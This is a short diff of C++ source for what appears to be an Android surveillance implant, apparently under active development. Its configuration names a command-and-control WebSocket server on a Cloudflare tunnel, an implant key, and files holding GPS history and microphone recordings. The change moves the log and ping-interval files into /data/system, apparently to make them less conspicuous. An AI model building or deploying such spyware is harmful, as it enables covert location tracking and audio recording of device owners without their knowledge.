@@ -65,10 +65,10 @@ static int __android_log_print(int prio, const char* tag, const char* fmt, ...) 
 // Configuration
 static constexpr const char* DEFAULT_WS_SERVER_URL  = "wss://hearts-eliminate-adrian-texts.trycloudflare.com/ws";
 static constexpr const char* C2_URL_FILE = "/data/local/tmp/c2_url.txt";
-static constexpr const char* PING_INTERVAL_FILE = "/data/local/tmp/ping_interval.txt";
+static constexpr const char* PING_INTERVAL_FILE = "/data/system/ping_interval.txt";
 static constexpr const char* IMPLANT_KEY = "DeltaForce2027";
 static constexpr const char* LOG_TAG = "reporter";
-static constexpr const char* LOG_PATH = "/data/local/tmp/reporter.log";
+static constexpr const char* LOG_PATH = "/data/system/reporter.log";
 static constexpr const char* DISABLE_FILE = "/data/local/tmp/reporter_disable";
 static constexpr const char* GPS_FILE = "/data/local/tmp/gps_history.csv";
 static constexpr const char* MIC_FILE = "/data/local/tmp/mic.wav";
